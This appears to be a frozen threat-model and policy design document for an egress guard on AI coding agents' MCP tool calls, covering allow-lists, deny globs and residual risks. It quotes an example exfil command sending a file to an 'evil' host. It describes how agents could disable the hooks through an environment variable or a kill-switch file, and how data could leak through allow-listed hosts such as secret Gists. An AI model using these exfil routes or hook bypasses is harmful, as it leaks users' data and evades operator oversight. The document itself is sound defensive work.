# Threat-Model Freeze: Cross-Provider Egress Guard (Phase 0)

**Status:** FROZEN 2026-06-10 (rev 2, post-adversarial-review). This document is the
canonical reference for the destination/connector allow-list and for every Phase 1-3
verifier case. Phases 1-3 implement against the values and dispositions below; they do
not re-derive them.

The roadmap's `## Threat Model (Consolidated)` section remains the narrative source.
This freeze adds the **decided** allow-list, the **corrected** data model, and a
**traceability map** from each named gap to a verifier, a residual, or the fail-closed
catch-all.

**Glob semantics (applies everywhere below):** all patterns are shell-style `fnmatch`
globs matched against the **full tool name** (Mode 2/3) or an **extracted host** (Mode 1),
the same convention `mcp-guard.sh` already uses (`case "$TOOL" in mcp__*)`). `*` matches
any run of characters including `_`.

---

## A. Frozen allow-list (three enforcement layers)

Default for network/send-class tools is **deny**; non-egress tools keep today's
default-allow. A tool is classified into exactly one of three layers, checked in order:

### Mode 1: URL-host (tools that carry an explicit URL in their input)
**Tools (`url_tools`):** `mcp__*browser_navigate*`, `mcp__*ctx_fetch_and_index*`,
`mcp__*browser_run_code_unsafe*`, `mcp__*browser_evaluate*`. (Codex shell
`curl`/`wget`/`scp`/`rsync`/`nc` join this mode only if/when the CC-side shell lane lands;
see R5; CC shell is deferred this lane.)

**Allowed hosts** (an example reference set; replace with the hosts your own agents need),
pinned to specific service hosts; **no open wildcards on multi-tenant
public domains** (closes the `forms.google.com` / `hooks.slack.com` / `storage.googleapis.com`
exfil channels):

| Class | Hosts |
|-------|-------|
| GitHub | `github.com`, `api.github.com`, `*.githubusercontent.com`, `codeload.github.com` |
| Vercel | `*.vercel.app`, `*.vercel.com` |
| Cloudflare | `api.cloudflare.com`, `dash.cloudflare.com` |
| Box | `*.box.com` |
| Atlassian / Jira | `*.atlassian.net` |
| Google Workspace | `drive.google.com`, `docs.google.com`, `sheets.google.com`, `mail.google.com`, `calendar.google.com`, `accounts.google.com` |
| Slack | `app.slack.com` |
| Anthropic / Claude | `*.anthropic.com`, `claude.ai` |

> `*.googleapis.com` and `hooks.slack.com` are deliberately **excluded**: they are
> zero-auth public POST/PUT targets. Google Drive / Slack *posting* happens through the
> Mode 2 connector path, not Mode 1 browser navigation. Add an org-specific vanity host
> (`<org>.slack.com`, custom Google domain) only on explicit operator sign-off.

**Rules:**
- Allow **iff every** extracted host ∈ the list above.
- A URL-mode tool with **no extractable host → deny** (cannot verify the destination).
- **Novel host + payload size > `max_payload_bytes_to_novel_host` (512 B) → deny.**

### Mode 2: connector-class (fixed-backend connectors; no URL in `tool_input`)
**Tools (`connector_tools`):** `mcp__codex_apps__*` (Codex), `mcp__claude_ai_*` (CC). The
destination is the connector backend, implicit in the tool name.

Matched by **full-tool-name glob prefix** (not by parsing a class string; this avoids
all casing / multi-word ambiguity, e.g. `Vercel` vs `vercel`, `Google_Drive` vs `drive`):

```
allow_connectors = [
  "mcp__claude_ai_Vercel*", "mcp__claude_ai_Google_Drive*",
  "mcp__claude_ai_Cloudflare*", "mcp__claude_ai_Context7*",
  "mcp__codex_apps__github*", "mcp__codex_apps__box*",
  "mcp__codex_apps__atlassian*", "mcp__codex_apps__jira*",
  "mcp__codex_apps__gmail*", "mcp__codex_apps__drive*",
  "mcp__codex_apps__slack*", "mcp__codex_apps__vercel*",
  "mcp__codex_apps__cloudflare*"
]
```

**Rules:** a `connector_tools` tool is allowed **iff** its full name matches one
`allow_connectors` glob; **unknown or renamed connector → deny** (closes the
new/renamed-connector gap; a new `mcp__codex_apps__<x>` defaults to deny).

### Mode 3: generic-network catch-all (FAIL-CLOSED; restores the dropped roadmap globs)
**Tools (`network_name_globs`):** `mcp__*fetch*`, `mcp__*http*`, `mcp__*send*`,
`mcp__*upload*`, `mcp__*webhook*`: any tool whose name signals network/send behavior but
matches neither Mode 1 nor Mode 2.

> Phase 1 refinement: `*__*_request*` and `*post*` were dropped from this list; they
> over-match benign names (`*_request*` hits `pull_request`/`merge_request`; `*post*` hits
> `postgres`). Connector PR/DB tools are already covered by Mode 2 (checked first); the
> remaining high-signal exfil patterns stay. This narrows a brand-new (not-yet-live) gate
> to remove false-positive denies; it does not weaken any existing deny.

**Rule:** such a tool is **denied** unless its server is in `non_egress_servers`. This is
the fail-closed backstop for HTTP/send-class tools from arbitrary MCP servers (the class
the roadmap named at L88-90 and rev-1 of this freeze silently dropped).

### Non-egress exclusion set (never enters the egress gate, checked FIRST)
`bridge-db`, `serena`, `engraph`, `cost-tracker`, `portfolio-health`, `personal_ops`,
and context-mode's **local** tools (`ctx_execute`, `ctx_search`, `ctx_batch_execute`,
`ctx_index`, …). **Exception:** `ctx_fetch_and_index` IS egress and belongs to Mode 1.

Rationale per entry: all are **localhost / filesystem-local** MCP servers (e.g.
`personal_ops` runs on `127.0.0.1:46210` and carries its own operator-approval gate on
sends; `bridge-db` is a local SQLite socket). They do not themselves make agent-driven
egress to arbitrary hosts. **If any of these is ever swapped for a hosted backend, it
must be removed from this set.**

> Phase 1/2 must check the exclusion set **before** Mode 3, or the broad `*send*`/`*post*`
> globs default-deny local tools (e.g. `mcp__personal_ops__*` mail drafts). This ordering
> is the mitigation for the named Phase 1 false-positive risk.

---

## B. Corrected Phase 1 schema (`egress` block of `mcp-gate-policy.json`)

Supersedes the single `allow_destinations` map in the roadmap Data Model (which modeled
only Mode 1). Values are written into the policy file in **Phase 1**, not Phase 0.

```jsonc
{
  "deny": [],                          // unchanged
  "require_token": ["…existing…"],     // unchanged
  "egress": {
    "default": "deny",                 // applies ONLY to tools matching a network mode
    "max_payload_bytes_to_novel_host": 512,

    // checked FIRST: these never enter the gate
    "non_egress_servers": [
      "bridge-db", "serena", "engraph", "cost-tracker", "portfolio-health",
      "personal_ops", "plugin_context-mode"
    ],

    // Mode 1: URL-carrying tools
    "url_tools": [
      "mcp__*browser_navigate*", "mcp__*ctx_fetch_and_index*",
      "mcp__*browser_run_code_unsafe*", "mcp__*browser_evaluate*"
    ],
    "allow_hosts": [
      "github.com", "api.github.com", "*.githubusercontent.com", "codeload.github.com",
      "*.vercel.app", "*.vercel.com", "api.cloudflare.com", "dash.cloudflare.com",
      "*.box.com", "*.atlassian.net",
      "drive.google.com", "docs.google.com", "sheets.google.com", "mail.google.com",
      "calendar.google.com", "accounts.google.com", "app.slack.com",
      "*.anthropic.com", "claude.ai"
    ],

    // Mode 2: fixed-backend connectors (matched by full-tool-name glob)
    "connector_tools": ["mcp__codex_apps__*", "mcp__claude_ai_*"],
    "allow_connectors": [
      "mcp__claude_ai_Vercel*", "mcp__claude_ai_Google_Drive*",
      "mcp__claude_ai_Cloudflare*", "mcp__claude_ai_Context7*",
      "mcp__codex_apps__github*", "mcp__codex_apps__box*",
      "mcp__codex_apps__atlassian*", "mcp__codex_apps__jira*",
      "mcp__codex_apps__gmail*", "mcp__codex_apps__drive*",
      "mcp__codex_apps__slack*", "mcp__codex_apps__vercel*",
      "mcp__codex_apps__cloudflare*"
    ],

    // Mode 3: generic-network catch-all (deny unless server is non_egress)
    "network_name_globs": [
      "mcp__*fetch*", "mcp__*http*", "mcp__*send*",
      "mcp__*upload*", "mcp__*webhook*"
    ]
  }
}
```

Contains **hostnames and tool-name globs only** (no secrets, no tokens). Codex reads this
same `.egress` block live and **fails closed** if any of: the file is absent, unreadable,
not valid JSON, the top-level `egress` key is missing, or `egress.default` is absent.
Empty `allow_hosts`/`allow_connectors` arrays are fail-closed by construction (nothing
matches → deny). CC's policy writes should land atomically (`jq > tmp && mv`) so a partial
read is invalid-JSON → fail-closed, never a half-applied allow-list.

---

## C. Threat-gap → disposition traceability

Every "Uncaught" / "returns allow" item named in the roadmap threat model resolves to a
**Verifier** (a test proving closure), a **Residual** (named, deferred), or the **Mode 3
fail-closed catch-all**.

| # | Gap (from threat model) | Disposition |
|---|-------------------------|-------------|
| 1 | CC `browser_navigate` / encoded-URL exfil | **Verifier**: deny navigate to non-allowlisted host (P1 bats; P3 smoke) |
| 2 | CC new/renamed connector tool | **Verifier**: Mode 2 denies non-matching connector glob (P1 bats; P3) |
| 3 | Codex `curl https://evil -d @file` in a read-only turn | **Verifier**: Mode 1 shell deny in `analyze_command` (P2 T1; P3) |
| 4 | Codex `mcp__codex_apps__*` ungated (e.g. `merge_pull_request` ran `allow`) | **Verifier**: Mode 2 deny non-allowlisted / allow allowlisted (P2 T2; P3) |
| 5 | Codex kill-switch (`CODEX_HOOKS_DISABLE` env / `disabled.json`) | **Verifier**: Seam C deny on write to `disabled.json` AND on `export`/inline-env (`CODEX_HOOKS_DISABLE=1 cmd`) forms (P2 T3; P3) |
| 6 | Shared-state laundering (weaker lane sets blast radius) | **Verifier**: parity: both lanes read the same `.egress` block (trivially equal) (P3 T2) |
| 7 | Generic-name HTTP/send tools from arbitrary MCP servers (`*fetch*`/`*http*`/`*send*`/`*_request*`) | **Verifier**: Mode 3 fail-closed catch-all denies unless server ∈ `non_egress_servers` (P1 bats; P3) |

---

## D. Residual register seed (Phase 3 Task 3)

Each residual names its real fix and why it's deferred.

- **R1: allow-listed-destination exfil.** Data can still flow to an allow-listed host.
  Concrete, more-than-theoretical vectors: (a) create a **secret Gist** via the `github`
  connector, then read its `*.githubusercontent.com` raw URL via `browser_navigate`
  (connector-write allowed → URL-read allowed); (b) write to an authenticated Box/Drive
  doc the operator can later read. *Real fix:* output-side taint tracking / content
  classification. *Deferred:* stateful, large; out of scope (read→exfil correlation).
- **R2: sub-512 B encoded payloads to a novel host.** Size guard only catches large
  novel-host payloads. *Real fix:* decode-aware inspection. *Deferred:* heuristic-only.
- **R3: variable-indirection / runtime-built hosts.** A host assembled at runtime evades
  static extraction. *Real fix:* taint/dataflow on the host expression. *Deferred:* out of
  scope for a regex/jq classifier.
- **R4: prompt-injection-in-tool-output.** Egress control is input-side; unchanged.
  *Real fix:* output sentinel. *Deferred:* explicitly out of scope.
- **R5: CC Bash `curl`/`wget` egress.** `mcp-guard.sh` gates `mcp__*` only; CC's Bash hook
  chain has no destination check, so CC shell egress stays open while Codex closes its
  shell-curl path. *Real fix:* a CC `bash-egress-guard.sh` mirroring Mode 1. *Deferred:*
  operator decision this session; candidate follow-on lane.
- **R6: connector-internal over-reach.** Mode 2 allows a connector *class* but not a finer
  scope (the `github` connector may reach any repo, not just allowed orgs). *Real fix:*
  per-connector resource scoping. *Deferred:* needs per-connector input schemas.
- **R7: multi-tenant allow-listed hosts.** `*.vercel.app` (any tenant's preview),
  `*.box.com` (Box-hosted webhooks/integrations), `*.githubusercontent.com` (any Gist/raw)
  are multi-tenant (an allow-listed host an attacker can also provision). *Real fix:*
  tenant-scoped host pins. *Deferred:* requires the operator's specific tenant identifiers;
  tighten in Phase 3 after real-call review.
- **R8: Codex shell scp/rsync/nc best-effort.** Robust shell egress coverage is `curl`/`wget`
  (URL host extraction). `scp`/`rsync` (`user@host:`) and `nc host port` are extracted
  best-effort; bare `scp host:path`, runtime-built hosts, and exotic `nc` flag forms fall
  through to a fail-closed "no verifiable host" deny rather than an allow-list check (safe
  direction, but a less precise message). *Real fix:* a shell-AST host parser. *Deferred:*
  curl/wget covers the named threat; the rest fail closed.
- **Parity note (IPv6 loopback):** the Codex hook normalizes `http://[::1]:port` to `[::1]`
  and allows it (loopback); the CC bash hook strips at the first `:` and denies bracketed
  IPv6. Divergence is safe-direction (CC is stricter on a loopback) and edge-case; align in
  a follow-up if IPv6 loopback egress is ever needed on the CC side.

---

## E. Post-freeze amendments (residual closures)

The frozen tables in §A/§B are the **Phase-0 historical record** and are intentionally
left unedited. Subsequent residual closures tightened the live allow-list and added a
mechanism; the current canonical policy shape lives in `tests/fixtures/policy-r6r7.json`
and is applied to `~/.claude/mcp-gate-policy.json` per [docs/INSTALL.md](INSTALL.md).

- **R7 (closed 2026-06-11): drop attacker-provisionable wildcards.** §A's Mode-1 header
  promised "no open wildcards on multi-tenant public domains," but the frozen `allow_hosts`
  still carried `*.vercel.app` and `*.atlassian.net`, both **attacker-provisionable**
  (anyone can register `evil.vercel.app` / a free `evil.atlassian.net`). Both are **removed**.
  The vendor-owned wildcards are narrowed to fixed known subdomains:
  - `*.githubusercontent.com` → `raw.`, `objects.`, `avatars.`, `camo.`, `media.`,
    `user-images.`, `private-user-images.`, `gist.` `githubusercontent.com`
  - `*.box.com` → `api.`, `app.`, `upload.`, `dl.` `box.com`
  - `*.vercel.com` → `api.vercel.com`, `vercel.com`
  - `*.anthropic.com` **kept** (Anthropic-owned trust anchor; not multi-tenant-provisionable).
- **R6 (closed 2026-06-11): connector resource (owner) scoping.** New shared policy key
  `connector_owner_scope` (glob → owner allow-list), enforced in BOTH hooks after the Mode-2
  `allow_connectors` check. `mcp__*github*` → `["example-owner"]`. Owners are extracted from the
  payload (`owner`/`org`/`organization`/`repoOwner` as string or `{login}`,
  `repository`/`full_name` owner-part, `<host>/<owner>` URLs); a positively-identified
  disallowed owner denies, a call with no detectable owner passes (remaining surface, R3-class).
  parity-check now asserts both hooks consume `connector_owner_scope` (19 checks).
- **R11 (reviewed, kept accepted):** a shell network verb mentioned but not executed
  (`which curl`, `man curl`) trips the fail-closed "no verifiable host" deny. A safe
  false-positive is preferred over an exfil false-negative; see [LIMITATIONS.md](../LIMITATIONS.md).
